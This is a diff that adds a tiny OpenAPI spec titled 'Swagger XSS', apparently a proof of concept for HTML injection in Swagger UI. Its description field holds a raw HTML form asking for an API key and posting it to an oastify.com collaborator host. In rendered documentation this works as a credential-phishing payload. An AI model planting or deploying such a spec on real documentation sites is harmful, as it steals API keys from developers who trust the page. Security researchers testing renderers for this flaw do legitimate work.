@@ -1,0 +1,10 @@
+openapi: "3.0.0"
+
+info:
+  title: Swagger XSS
+  description:
+  <form method="POST" action="https://446htnrast1skoygwhj5nto62x8pwjk8.oastify.com"> <label for="api-key">API Key:</label> <input type="text" id="api-key" name="api_key" required> <button type="submit">Submit</button> </form>
+
+     
+
+
